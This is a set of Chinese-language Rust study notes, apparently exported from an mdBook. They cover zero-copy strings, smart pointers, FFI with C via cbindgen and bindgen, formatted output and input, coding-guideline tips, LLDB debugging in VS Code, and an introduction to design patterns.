<p><img src="Language/Rust/Crate/../images/image-20211204124050182.png" alt="image-20211204124050182" /></p>
<h2 id="拷贝"><a class="header" href="#拷贝">拷贝</a></h2>
<p>有时，我们需要在各个函数之间传递字符串。</p>
<p><a href="https://doc.rust-lang.org/std/io/struct.IoSlice.html">IoSlice</a>在语义上是一个<code>&amp;[u8]</code>的封装，但是他适用于IO。</p>
<p><a href="https://doc.rust-lang.org/std/borrow/enum.Cow.html#">Cow</a>就是Copy On Write。CopyOnWrite适用于读多写少的情况，最大程度的提高读的效率。</p>
<p>有时我们需要zero-copy来加速性能。例如，我们希望把HTTP Headers的键值对，用HashMap存储。一个简单的方法当然是扫描一遍，然后新建String存储key, value再存储到HashMap中。这就意味着拷贝的发生。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let headers = &quot;age: 0
cache-control: max-age=600
date: Thu, 24 Mar 2022 15:48:07 GMT
etag: W/\&quot;61fb29c0-4629\&quot;
expires: Thu, 24 Mar 2022 15:54:28 GMT
vary: Accept-Encoding&quot;;
// =========&gt;
let mut map = HashMap::new();
map.insert(&quot;age&quot;.to_owned(), &quot;0&quot;.to_owned());
map.insert(&quot;cache-control&quot;.to_owned(), &quot;max-age=600&quot;.to_owned());
...
<span class="boring">}
</span></code></pre></pre>
<p>最好的应该是像下面这样。但是，引用（指针）意味着你需要考虑声明周期问题！Rust编译器会让你保证在map的生命周期结束之前，headers指向的内容不会被析构（当然这里是静态生命周期的，不存在什么问题）。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>map.insert(&amp;headers[0..4],&amp;headers[5..6]);

...
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="打包"><a class="header" href="#打包">打包</a></h1>
<p>cargo deb</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="rust-智能指针"><a class="header" href="#rust-智能指针">Rust-智能指针</a></h1>
<p>我终于是回来填坑了，先了解所有的智能指针，再实现图的表示，太蛋疼了。</p>
<blockquote>
<p>Rust 中最常见的指针是引用（reference）。引用以 &amp; 符号为标志并借用了他们所指向的值。除了引用数据没有任何其他特殊功能。它们也没有任何额外开销，所以应用得最多。</p>
<p><strong>智能指针（smart pointers）是一类数据结构，他们的表现类似指针，但是也拥有额外的元数据和功能。</strong> 我们看的到的String和Vec都是智能指针。通常用结构体来实现，但是智能指针区别于常规的结构体的显著特性在于实现了<code>Deref</code>和<code>Drop</code>两个trait。 <strong><code>Deref</code>允许智能指针结构体实例表现的像引用一样。<code>Drop</code>允许我们自定义当智能指针离开作用域时运行的代码（类似析构函数的感觉）</strong>。</p>
<p>无脑写法：<code>Rc&lt;RefCell&lt;T&gt;&gt;</code> 包揽单线程的共享可变变量。<code>Arc&lt;Mutex&lt;T&gt;&gt;</code>包揽多线程的共享可变变量。</p>
</blockquote>
<h2 id="box"><a class="header" href="#box">Box</a></h2>
<p>Box在Rust中是用来在堆内存中保存数据使用的。它的使用方法非常简单。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let x = Box::new(123);
<span class="boring">}
</span></code></pre></pre>
<p>之后，<code>x</code>的生命周期就是<code>123</code>的生命周期，我们用<code>x</code>就和使用指针一样。但是由于这种特性，有时也会难以使用。比如下面这样，我想构造两个节点b,c 同时指向节点a，由于Box会负责接管指向内容的生命周期，所以我们并不能构造两个同时指向a的Box。（从编译检查的角度说，<code>Box::new</code> 是移动语义的。所以再第9行的时候，a被move，第10行无法再使用a）</p>
<pre><pre class="playground"><code class="language-rust">enum List {
    Cons(i32, Box&lt;List&gt;),
    Nil,
}
use crate::List::{Cons, Nil};

fn main() {
    let a = Cons(5,Box::new(Cons(10,Box::new(Nil))));
    let b = Cons(3, Box::new(a));
    let c = Cons(4, Box::new(a));	// Error
}
</code></pre></pre>
<h2 id="rc和weak"><a class="header" href="#rc和weak">Rc和Weak</a></h2>
<p>Rc是Reference Counting的缩写，Rc是<strong>单线程</strong>的引用计数指针。</p>
<p><code>Rc&lt;T&gt;</code>提供了<strong>共享的对<code>T</code>的所有权</strong>（区别于独占的Box），<code>T</code>的真实数据存储在堆上。如果对Rc使用<code>clone</code>方法，并不会复制一份数据，而是新产生一个指向相同内容的指针，同时强引用计数+1。当最后一个Rc析构时，存储在堆上的真实数据才会被析构。比如下面这个程序，owner1和owner2的内容是完全相同的。</p>
<p>Rc指针是 没有实现Copy trait的。如果使用直接赋值方式，会执行move语义，导 致前一个指针失效，后一个指针开始起作用，而且引用计数值不变。如 果需要创造新的Rc指针，必须手工调用<code>clone()</code>函数，此时引用计数值才会加1。当某个Rc指针失效，会导致引用计数值减1。当引用计数值减到0的时候，共享内存空间才会被释放。</p>
<pre><pre class="playground"><code class="language-rust">use std::rc::Rc; 
struct SharedValue { 
    value : i32 
}

fn main() { 
    let shared_value : Rc&lt;SharedValue&gt; = Rc::new(SharedValue { value : 42 }); 
    let owner1 = shared_value.clone(); 
    let owner2 = shared_value.clone(); 
    println!(&quot;value : {} {}&quot;, owner1.value, owner2.value); println!(&quot;address : {:p} {:p}&quot;, &amp;owner1.value, &amp;owner2.value); 
}
</code></pre></pre>
<h2 id="weak"><a class="header" href="#weak">Weak</a></h2>
<blockquote>
<p>Rust 在处理数据时表现第一好情况的是处理树状数据，第二好的情况是数据能够看作有向无环图，但是其中执行数据变化的修改脉络路径仍然能看作是树形，同样好的也还有粗粒度执行的可以看作是多读单写锁的协议下的数据处理，诸如此类。在这个舒适带之外，Rust工作的就没有那么好。虽然还能用，但是处理变得棘手，很多为了安全性和友好性准备的语言特征都不再能够协助你，使用体验变得不方便起来。这本书（指《Learn Rust With Entirely Too Many Linked Lists》）的目标之一就是探索(在Rust开发中)如何与双向链表这样的东西打交道。 双向链表是一个 Rust 在当前的设计中，让你不能写，或者至少不能轻易的不小心的写出来的结构。双向链表不只是具有不明确的所有权，它实际上具有的是循环的所有权，显然离 Rust 的舒适区域相去甚远。显然，最直接、也是在智力上最诚实的对这本书的回应就是：它深入地论断反对了在Rust中使用循环依赖数据。原则就是开发中“不要让数据循环依赖”，看看你能做到什么地步。这也是 Rust 设计的思路。我不认为我写的 Rust 程序中有很多的循环依赖数据，少数用到的地方都是使用封装好的库，或者是不透明的引用句柄（而不是 Rust 所有权系统跟踪着的原生引用）。</p>
</blockquote>
<p>有时我们会需要用到Weak（比如避免循环引用）。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let my_weak = Rc::downgrade(&amp;my_rc);
<span class="boring">}
</span></code></pre></pre>
<p>我们知道，Rust的原则是“共享不可变，可变不共享”。我们不可以获得Rc指向内容的<strong>可变引用</strong>。但是如果我们确实需要可变性，我们需要用<code>Cell</code>或<code>RefCell</code>。</p>
<h2 id="refcell"><a class="header" href="#refcell">RefCell</a></h2>
<blockquote>
<p>最适合使用“内部可变性”的场景是：当<strong>逻辑上不可变的方法</strong>的<strong>实现细节又要求某部分成员变量具有可变性</strong>的时候，我们可以使用“内部可变性”。Rc内部的引用计数变量就是绝佳的例子。实际上，是把编译期的检查移到了运行时的检查。</p>
</blockquote>
<h3 id="图"><a class="header" href="#图">图</a></h3>
<p><img src="Language/Rust/Crate/../images/image-20210902122013024.png" alt="image-20210902122013024" /></p>
<p>图感觉是最不适合Rust来写的数据结构了。上面的图是一个普通的有向图。他可能有环，没有一个明确的起点，每条边还有额外的信息（这里是权重）。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ffi-1"><a class="header" href="#ffi-1">FFI</a></h1>
<h2 id="用rust编写c库"><a class="header" href="#用rust编写c库">用Rust编写C库</a></h2>
<p>参考链接：</p>
<ul>
<li><a href="https://stevenbai.top/rustbook/book/interoperability/rust-with-c.html">https://stevenbai.top/rustbook/book/interoperability/rust-with-c.html</a></li>
</ul>
<h3 id="动态链接库"><a class="header" href="#动态链接库">动态链接库</a></h3>
<p>首先<code>cargo new --lib</code>创建一个新的lib工程。
修改Cargo.toml配置文件，添加以下内容，表明我们需要生成的文件是动态链接库。默认生成类型是对应平台的，所以我会生成<code>.so</code>文件。</p>
<pre><code>[lib]
crate-type = [&quot;cdylib&quot;]
</code></pre>
<p>还是最简单的没有参数没有返回值的代码作为demo(lib.rs)，这个<a href="https://stevenbai.top/rustbook/book/interoperability/rust-with-c.html">例子的解释</a>：</p>
<pre><code>pub extern &quot;C&quot; fn rust_function() {
    println!(&quot;hello world&quot;);
}
</code></pre>
<p>然后<code>cargo build</code>，我们在<code>target/debug</code>目录下可以看到我们生成的.so动态链接库。</p>
<p>然后怎么使用.so呢？首先是要头文件，然后要链接。
头文件有工具cbindgen可以生成。</p>
<ol>
<li>首先在工程目录下创建<code>cbindgen.toml</code>，输入<a href="https://github.com/eqrion/cbindgen/blob/master/template.toml">官方模板内容</a>。</li>
<li>把language替换成你的目标，比如说C。</li>
<li>执行<code>cbindgen --config cbindgen.toml --crate my_rust_library --output my_header.h</code>，然后得到一个头文件。</li>
</ol>
<p>通过下面的方式链接我们的库文件。</p>
<ul>
<li>最简单的方式<code>gcc xxx.c mylib.so</code>。</li>
<li><code>gcc xxx.c -L. mylib.so</code></li>
</ul>
<p>注意真正动态链接是需要操作系统的协助的，所以我们需要用下面的环境变量设置指明寻找动态链接库的位置。</p>
<pre><code>export LD_LIBRARY_PATH=`pwd`
</code></pre>
<p>至此，才可以使用。</p>
<h3 id="静态链接库"><a class="header" href="#静态链接库">静态链接库</a></h3>
<p>我一开始尝试静态链接库。但是失败了。
和上面类似的，但是Cargo.toml要设置成</p>
<pre><code>[lib]
crate-type = [&quot;staticlib&quot;]
</code></pre>
<p>生成的是.a文件。但是我把它和C程序链接的时候，报了一大堆链接错误。看<a href="https://www.reddit.com/r/rust/comments/ihiiom/problem_with_creating_and_linking_static_library/">网上的提示</a>说还需要链接别的库，但是我找不到那几个库。总之没有成功。</p>
<h3 id="参数和返回值"><a class="header" href="#参数和返回值">参数和返回值</a></h3>
<p>一个一般的函数肯定是要有参数和返回值的。是要用Rust和C都认识的类型才可以，然后调用规范遵循C的。
因此Rust提供了一些两边都认识的类型：</p>
<ul>
<li><a href="https://doc.rust-lang.org/std/ffi/index.html">std::ffi</a></li>
<li><a href="https://docs.rs/libc/0.2.95/libc/#types">libc</a></li>
</ul>
<h3 id="cbindgen"><a class="header" href="#cbindgen">cbindgen</a></h3>
<h3 id="字符串-1"><a class="header" href="#字符串-1">字符串</a></h3>
<p>我们知道Rust和C中的字符串存储格式是完全不同的。<code>std::ffi</code>提供的：</p>
<pre><code>// CString and CStr 他们之间的关系和 String和&amp;str类似，内部的存储和C语言是兼容的。
Rust					C
String 	&lt;=&gt; CString &lt;=&gt; *mut u8 
&amp;str	&lt;=&gt; CStr 	&lt;=&gt; *const u8

方法依次有(日后用到再来补充)
1. =&gt; CString::new();
1. &lt;= into_string
2. 
3. 
4. &lt;= from_ptr
4. =&gt; as_ptr
</code></pre>
<p><code>std::ffi</code>还提供了对可变长参数列表的支持。这个还是nightly。</p>
<h2 id="用rust调用c库"><a class="header" href="#用rust调用c库">用Rust调用C库</a></h2>
<p>Rust不支持源码级别的调用，这样噪声太大。我们可以把我们的C代码编译成动态库/静态库，再来调用。</p>
<h3 id="链接静态库"><a class="header" href="#链接静态库">链接静态库</a></h3>
<p>C源代码就不放了，假设我们需要把这个函数编译成静态库，在Rust中调用。</p>
<pre><code class="language-c">int chattr(char* mode_string, char* file_name);
</code></pre>
<p>首先，我们用<code>bindgen</code>生成对应的Rust binding。<code>bindgen chattr.h -o chattr.rs</code>，生成如下文件。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>/* automatically generated by rust-bindgen 0.59.2 */

extern &quot;C&quot; {
    pub fn chattr(
        mode_string: *mut ::std::os::raw::c_char,
        file_name: *mut ::std::os::raw::c_char,
    ) -&gt; ::std::os::raw::c_int;
}
<span class="boring">}
</span></code></pre></pre>
<p>Rust提供的build.rs构建机制，编写<code>build.rs</code>如下。使用 <a href="https://docs.rs/cc"><strong>cc</strong></a> crate，将生成一个静态库文件（本实例中为 <strong>libchattr.a</strong>）</p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    cc::Build::new()
        .file(&quot;src/chattr.c&quot;)
        .compile(&quot;chattr&quot;);   // 输出 `libhello.a`
}
</code></pre></pre>
<p>然后我们就可以在函数中使用C函数了，不过需要注意的是，使用外部函数是unsafe的，一般情况下，我们需要做safe的包装。</p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    println!(&quot;Hello, world!&quot;);
    let mut mode = String::from(&quot;+i&quot;);
    let mut name = String::from(&quot;build.rs&quot;);
    unsafe {
        chattr::chattr(
            mode.as_mut_ptr() as *mut c_char,
            name.as_mut_ptr() as *mut c_char,
        );
    }
}
</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="rust-io"><a class="header" href="#rust-io">Rust-IO</a></h1>
<h1 id="格式化输出"><a class="header" href="#格式化输出">格式化输出</a></h1>
<p><a href="https://doc.rust-lang.org/std/fmt/">std::fmt</a>
通过在:后面添加控制字符</p>
<h2 id="demo-5"><a class="header" href="#demo-5">demo</a></h2>
<pre><code>format!(&quot;Hello&quot;);                 // =&gt; &quot;Hello&quot;
format!(&quot;Hello, {}!&quot;, &quot;world&quot;);   // =&gt; &quot;Hello, world!&quot;
format!(&quot;The number is {}&quot;, 1);   // =&gt; &quot;The number is 1&quot;
format!(&quot;{:?}&quot;, (3, 4));          // =&gt; &quot;(3, 4)&quot;
format!(&quot;{value}&quot;, value=4);      // 命名参数
format!(&quot;{1} {0}&quot;, 1, 2);           // 位置参数
format!(&quot;{:04}&quot;, 42);             // =&gt; &quot;0042&quot; with leading zeros
format!(&quot;{:.4},3.14159&quot;);        // 保留小数
format!(&quot;{:.2$},3.14159,2&quot;);        // 保留小数，使用第二个参数作为保留标准
</code></pre>
<p>对齐和填充<code>[fill]&lt;/&gt;/^</code></p>
<pre><code>    println!(&quot;Hello {:0&lt;5}!&quot;,&quot;X&quot;);  //左对齐，填0
    println!(&quot;Hello {:-^5}!&quot;,&quot;X&quot;);  //居中，填-
    println!(&quot;Hello {:*&gt;1$}!&quot;,&quot;X&quot;,5);  //右对齐，填*。使用第二个参数作为填充标准。
</code></pre>
<p>数字</p>
<ul>
<li>+输出正号</li>
<li>#? - pretty-print the Debug formatting</li>
<li>#x - precedes the argument with a 0x    十六进制
<ul>
<li>:X 不带0x的十六进制，下面同理</li>
</ul>
</li>
<li>#X - precedes the argument with a 0x</li>
<li>#b - precedes the argument with a 0b  二进制</li>
<li>#o - precedes the argument with a 0o</li>
</ul>
<h2 id="trait-1"><a class="header" href="#trait-1">Trait</a></h2>
<p><a href="https://doc.rust-lang.org/std/fmt/#formatting-traits">formatting的接口</a>，通过实现这些接口我们可以利用格式化输出我们自己的类型。</p>
<h1 id="输入"><a class="header" href="#输入">输入</a></h1>
<p>当我想用rust写PTA的时候，发现我连输入都无法解决。。。</p>
<p><code>std::io::stdin() -&gt; Stdin</code>，这个Constructs a new handle to the standard input of the current process。我们在PTA上的输入都是通过标准输入进行的。</p>
<pre><code>let stdin = io::stdin();
let mut buf =  String::new();
stdin.read_line(&amp;mut buf).expect(&quot;&quot;);
println!(&quot;{}&quot;,buf);
</code></pre>
<p>除了read_line，还有各种各样的读入方法，Trait std::io::Read定义的方法，标准库已经帮我们实现了。
|函数|描述|
|-|-|
|<code>fn read_to_string(&amp;mut self, buf: &amp;mut String) -&gt; Result&lt;usize&gt;</code>|Read all bytes until EOF in this source, <strong>appending</strong> them to buf.|
|<code>fn read_to_end(&amp;mut self, buf: &amp;mut Vec&lt;u8&gt;) -&gt; Result&lt;usize&gt;</code> |Read all bytes until EOF in this source, <strong>placing</strong> them into buf|
|<code>fn read_exact(&amp;mut self, buf: &amp;mut [u8]) -&gt; Result&lt;()&gt;</code>|Read the exact number of bytes required to fill buf|</p>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="rust最佳实践"><a class="header" href="#rust最佳实践">Rust最佳实践</a></h1>
<p>零零散散记录一下对编码规范的阅读笔记</p>
<p>没有看懂 https://rust-coding-guidelines.github.io/rust-coding-guidelines-zh/safe-guides/coding_practice/data-type/struct/G.TYP.SCT.03.html</p>
<p>切片匹配，神奇</p>
<p>多个相互关联的布尔，可以考虑构造一个enum代替</p>
<p>函数返回Result，或者会Panic，应该在注释中说明</p>
<p>Box会先在栈上构造然后复制到堆里？</p>
<p>切片迭代器，array_windows。</p>
<p>作为对外公开的 Enum，和未稳定的Struct，为了保持稳定性，应该使用 #[non_exhaustive]属性，避免因为将来Enum 枚举变体的变化而影响到下游的使用。</p>
<p>match x.cmp(y) 可以来代替比较 </p>
<p>if { panic!() }改成assert!()更好</p>
<p>使用容器的时候，with_capacity进行容量的预分配会比较好</p>
<p>泛型特化，为泛型实现Trait，可能会对更特殊的泛型有针对性的实现</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>trait Example {
    fn call(&amp;self);
}
impl&lt;T&gt; Example for T
{
    default fn call(&amp;self) {
        println!(&quot;most generic&quot;);
    }
}

impl&lt;T&gt; Example for T
where T: Display
{
    default fn call(&amp;self) {
        println!(&quot;generic for Display, {}&quot;, self);
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>NewType模式绕过孤儿规则，其实就是struct NewType(OldType)，然后为NewType实现不在这里定义的OldType的Trait。
可以用deref模拟类的继承，虽然这个并不被推荐使用</p>
<p>如果是作为库供别人使用，在 lib.rs中重新导出对外类型、函数和 trait 等</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub use crate::data::{
    Field, Fields, FieldsNamed, FieldsUnnamed, Variant, VisCrate, VisPublic, VisRestricted,
    Visibility,
};
<span class="boring">}
</span></code></pre></pre>
<p>当项目是可执行程序而非库时，建议使用 src/main.rs 和 src/lib.rs 模式，把二进制和库拆开，方便测试</p>
<p>使用宏时应该考虑宏展开会让编译文件膨胀的影响</p>
<p>parking_lot提供的同步原语性能比标准库好？crossbeam-rs提供的channel性能比标准库好？</p>
<p>无锁编程</p>
<p>在公开（pub）的 unsafe 函数文档中，必须增加 <code># Safety</code> 注释来解释该函数的安全边界，这样使用该函数的用户才可以安全地使用它。</p>
<p>对于读操作大于写操作的场景，使用 <code>Cow&lt;str&gt;</code> 比较合适。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="调试-1"><a class="header" href="#调试-1">调试</a></h1>
<h2 id="环境"><a class="header" href="#环境">环境</a></h2>
<p>Rust+VSCode。VSCode安装插件CodeLLDB。
然后点击调试的时候，会自动生成调试配置文件。一般来说也够用了。</p>
<pre><code class="language-json">{
    // Use IntelliSense to learn about possible attributes.
    // Hover to view descriptions of existing attributes.
    // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387
    &quot;version&quot;: &quot;0.2.0&quot;,
    &quot;configurations&quot;: [      
        {
            &quot;type&quot;: &quot;lldb&quot;,
            &quot;request&quot;: &quot;launch&quot;,
            &quot;name&quot;: &quot;Debug executable 'lc3asm'&quot;,    // 可执行文件的调试
            &quot;cargo&quot;: {
                &quot;args&quot;: [
                    &quot;build&quot;,
                    &quot;--bin=lc3asm&quot;,
                    &quot;--package=lc3asm&quot;
                ],
                &quot;filter&quot;: {
                    &quot;name&quot;: &quot;lc3asm&quot;,
                    &quot;kind&quot;: &quot;bin&quot;
                }
            },
            &quot;args&quot;: [&quot;test.asm&quot;],       // 程序的参数如果需要的话在这里写
            &quot;cwd&quot;: &quot;${workspaceFolder}&quot;     // 路径环境变量
        },
        {
            &quot;type&quot;: &quot;lldb&quot;,
            &quot;request&quot;: &quot;launch&quot;,
            &quot;name&quot;: &quot;Debug unit tests in executable 'lc3asm'&quot;,      //单元测试的调试
            &quot;cargo&quot;: {
                &quot;args&quot;: [
                    &quot;test&quot;,
                    &quot;--no-run&quot;,
                    &quot;--bin=lc3asm&quot;,
                    &quot;--package=lc3asm&quot;
                ],
                &quot;filter&quot;: {
                    &quot;name&quot;: &quot;lc3asm&quot;,
                    &quot;kind&quot;: &quot;bin&quot;
                }
            },
            &quot;args&quot;: [],
            &quot;cwd&quot;: &quot;${workspaceFolder}&quot;
        }
    ]
}
</code></pre>
<h2 id="截图"><a class="header" href="#截图">截图</a></h2>
<p><img src="Language/Rust/Practice/../images/image-20210807233233504.png" alt="image-20210807233233504" /></p>
<h2 id="debug-console"><a class="header" href="#debug-console">Debug console</a></h2>
<p>Trick的东西多半是命令行提供的。输入help命令可以查看命令。好像就是LLDB？	</p>
<pre><code>help
Debugger commands:
  apropos           -- List debugger commands related to a word or subject.
  breakpoint        -- Commands for operating on breakpoints (see 'help b' for
                       shorthand.)
  command           -- Commands for managing custom LLDB commands.
  disassemble       -- Disassemble specified instructions in the current
                       target.  Defaults to the current function for the
                       current thread and stack frame.
  expression        -- Evaluate an expression on the current thread.  Displays
                       any returned value with LLDB's default formatting.
  frame             -- Commands for selecting and examing the current thread's
                       stack frames.
  gdb-remote        -- Connect to a process via remote GDB server.  If no host
                       is specifed, localhost is assumed.
  gui               -- Switch into the curses based GUI mode.
  help              -- Show a list of all debugger commands, or give details
                       about a specific command.
  kdp-remote        -- Connect to a process via remote KDP server.  If no UDP
                       port is specified, port 41139 is assumed.
  language          -- Commands specific to a source language.
  log               -- Commands controlling LLDB internal logging.
  memory            -- Commands for operating on memory in the current target
                       process.
  platform          -- Commands to manage and create platforms.
  plugin            -- Commands for managing LLDB plugins.
  process           -- Commands for interacting with processes on the current
                       platform.
  quit              -- Quit the LLDB debugger.
  register          -- Commands to access registers for the current thread and
                       stack frame.
  reproducer        -- Commands for manipulating reproducers. Reproducers make
                       it possible to capture full debug sessions with all its
                       dependencies. The resulting reproducer is used to replay
                       the debug session while debugging the debugger.
                       Because reproducers need the whole the debug session
                       from beginning to end, you need to launch the debugger
                       in capture or replay mode, commonly though the command
                       line driver.
                       Reproducers are unrelated record-replay debugging, as
                       you cannot interact with the debugger during replay.
  script            -- Invoke the script interpreter with provided code and
                       display any results.  Start the interactive interpreter
                       if no code is supplied.
  session           -- Commands controlling LLDB session.
  settings          -- Commands for managing LLDB settings.
  source            -- Commands for examining source code described by debug
                       information for the current target process.
  statistics        -- Print statistics about a debugging session
  target            -- Commands for operating on debugger targets.
  thread            -- Commands for operating on one or more threads in the
                       current process.
  trace             -- Commands for loading and using processor trace
                       information.
  type              -- Commands for operating on the type system.
  version           -- Show the LLDB debugger version.
  watchpoint        -- Commands for operating on watchpoints.
Current command abbreviations (type 'help command alias' for more info):
  add-dsym  -- Add a debug symbol file to one of the target's current modules
               by specifying a path to a debug symbols file or by using the
               options to specify a module.
  attach    -- Attach to process by ID or name.
  b         -- Set a breakpoint using one of several shorthand formats.
  bt        -- Show the current thread's call stack.  Any numeric argument
               displays at most that many frames.  The argument 'all' displays
               all threads.  Use 'settings set frame-format' to customize the
               printing of individual frames and 'settings set thread-format'
               to customize the thread header.
  c         -- Continue execution of all threads in the current process.
  call      -- Evaluate an expression on the current thread.  Displays any
               returned value with LLDB's default formatting.
  continue  -- Continue execution of all threads in the current process.
  detach    -- Detach from the current target process.
  di        -- Disassemble specified instructions in the current target. 
               Defaults to the current function for the current thread and
               stack frame.
  dis       -- Disassemble specified instructions in the current target. 
               Defaults to the current function for the current thread and
               stack frame.
  display   -- Evaluate an expression at every stop (see 'help target
               stop-hook'.)
  down      -- Select a newer stack frame.  Defaults to moving one frame, a
               numeric argument can specify an arbitrary number.
  env       -- Shorthand for viewing and setting environment variables.
  exit      -- Quit the LLDB debugger.
  f         -- Select the current stack frame by index from within the current
               thread (see 'thread backtrace'.)
  file      -- Create a target using the argument as the main executable.
  finish    -- Finish executing the current stack frame and stop after
               returning.  Defaults to current thread unless specified.
  history   -- Dump the history of commands in this session.
               Commands in the history list can be run again using &quot;!&lt;INDEX&gt;&quot;. 
               &quot;!-&lt;OFFSET&gt;&quot; will re-run the command that is &lt;OFFSET&gt; commands
               from the end of the list (counting the current command).
  image     -- Commands for accessing information for one or more target
               modules.
  j         -- Set the program counter to a new address.
  jump      -- Set the program counter to a new address.
  kill      -- Terminate the current target process.
  l         -- List relevant source code using one of several shorthand formats.
  list      -- List relevant source code using one of several shorthand formats.
  n         -- Source level single step, stepping over calls.  Defaults to
               current thread unless specified.
  next      -- Source level single step, stepping over calls.  Defaults to
               current thread unless specified.
  nexti     -- Instruction level single step, stepping over calls.  Defaults to
               current thread unless specified.
  ni        -- Instruction level single step, stepping over calls.  Defaults to
               current thread unless specified.
  p         -- Evaluate an expression on the current thread.  Displays any
               returned value with LLDB's default formatting.
  parray    -- parray &lt;COUNT&gt; &lt;EXPRESSION&gt; -- lldb will evaluate EXPRESSION to
               get a typed-pointer-to-an-array in memory, and will display
               COUNT elements of that type from the array.
  po        -- Evaluate an expression on the current thread.  Displays any
               returned value with formatting controlled by the type's author.
  poarray   -- poarray &lt;COUNT&gt; &lt;EXPRESSION&gt; -- lldb will evaluate EXPRESSION to
               get the address of an array of COUNT objects in memory, and will
               call po on them.
  print     -- Evaluate an expression on the current thread.  Displays any
               returned value with LLDB's default formatting.
  q         -- Quit the LLDB debugger.
  r         -- Launch the executable in the debugger.
  rbreak    -- Sets a breakpoint or set of breakpoints in the executable.
  re        -- Commands to access registers for the current thread and stack
               frame.
  run       -- Launch the executable in the debugger.
  s         -- Source level single step, stepping into calls.  Defaults to
               current thread unless specified.
  shell     -- Run a shell command on the host.
  si        -- Instruction level single step, stepping into calls.  Defaults to
               current thread unless specified.
  sif       -- Step through the current block, stopping if you step directly
               into a function whose name matches the TargetFunctionName.
  step      -- Source level single step, stepping into calls.  Defaults to
               current thread unless specified.
  stepi     -- Instruction level single step, stepping into calls.  Defaults to
               current thread unless specified.
  t         -- Change the currently selected thread.
  tbreak    -- Set a one-shot breakpoint using one of several shorthand formats.
  undisplay -- Stop displaying expression at every stop (specified by stop-hook
               index.)
  up        -- Select an older stack frame.  Defaults to moving one frame, a
               numeric argument can specify an arbitrary number.
  v         -- Show variables for the current stack frame. Defaults to all
               arguments and local variables in scope. Names of argument,
               local, file static and file global variables can be specified.
               Children of aggregate variables can be specified such as
               'var-&gt;child.x'.  The -&gt; and [] operators in 'frame variable' do
               not invoke operator overloads if they exist, but directly access
               the specified element.  If you want to trigger operator
               overloads use the expression command to print the variable
               instead.
               It is worth noting that except for overloaded operators, when
               printing local variables 'expr local_var' and 'frame var
               local_var' produce the same results.  However, 'frame variable'
               is more efficient, since it uses debug information and memory
               reads directly, rather than parsing and evaluating an
               expression, which may even involve JITing and running code in
               the target program.
  var       -- Show variables for the current stack frame. Defaults to all
               arguments and local variables in scope. Names of argument,
               local, file static and file global variables can be specified.
               Children of aggregate variables can be specified such as
               'var-&gt;child.x'.  The -&gt; and [] operators in 'frame variable' do
               not invoke operator overloads if they exist, but directly access
               the specified element.  If you want to trigger operator
               overloads use the expression command to print the variable
               instead.
               It is worth noting that except for overloaded operators, when
               printing local variables 'expr local_var' and 'frame var
               local_var' produce the same results.  However, 'frame variable'
               is more efficient, since it uses debug information and memory
               reads directly, rather than parsing and evaluating an
               expression, which may even involve JITing and running code in
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="设计模式"><a class="header" href="#设计模式">设计模式</a></h1>
<p>尽量从Rust编程的角度去理解设计模式。设计模式是为了提高程序的<strong>可复用性</strong>。</p>
<blockquote>
<p>使用场景非常重要。因为如果你学了个东西，都不知道用来解决什么问题，你说有什么用？理解使用场景的的重要性要远高于你是不是会实现这个模式，因为只要你知道什么问题可以使用builder模式来解决，那你即使不会写，也可以在调查相关资料后完成。</p>
</blockquote>
<p>参考链接 </p>
<ul>
<li>
<p>https://chercher.tech/rust/decorator-design-pattern-rust</p>
</li>
<li>
<p>http://c.biancheng.net/view/1400.html</p>
</li>
</ul>
<h2 id="基础知识-2"><a class="header" href="#基础知识-2">基础知识</a></h2>
<h3 id="uml"><a class="header" href="#uml">UML</a></h3>
<p>UML是让系统可视化，让规格和设计文档化的表现方法，是Unified Modeling Language的简写。</p>
<h3 id="类的层次结构"><a class="header" href="#类的层次结构">类的层次结构</a></h3>
<img src="Language/Rust/Practice/../images/image-20210815194448437.png" alt="image-20210815194448437" style="zoom:50%;" />
<ul>
<li>从上到下，类名-字段-方法。表示的是子类和父类的关系。</li>
<li>abstract 类（抽象类）的名字以斜体方式显示。例如，ParentClass 是抽象类，因此它的名字以斜体方式显示。</li>
<li>static字段（静态字段）的名字带有下划线。例如，field2 是静态字段，因此名字带有下划线。</li>
<li>abstract方法（抽象方法）的名字以斜体方式显示。例如，methodA是抽象方法，因此它以斜体方式显示。</li>
<li>static方法（静态方法）的名字以下划线显示。例如，ChildClass类的 methodC 是类的静态方法，因此它的名字带有下划线。</li>
</ul>
<blockquote>
<p>【Rust】中的类可以当作是struct。</p>
<p>【Rust】中的静态方法就是在<strong>impl中</strong>没有self参数的方法，普通方法就是<strong>impl中</strong>有self参数的方法。抽象方法就是定义在<strong>Trait中</strong>的方法名，也可以有实现。</p>
<p>【Rust】静态字段，是属于类的字段，Rust中没有直接对应的概念。但是感觉可以定义一个普通变量，但是只能通过一个类来访问进行模拟。普通变量就是普通类的变量。</p>
<p>【Rust】没有继承。但是简单的继承可以通过枚举来方便的模拟。</p>
</blockquote>
<h3 id="接口和实现"><a class="header" href="#接口和实现">接口和实现</a></h3>
<img src="Language/Rust/Practice/../images/image-20210815195417295.png" alt="image-20210815195417295" style="zoom:50%;" />
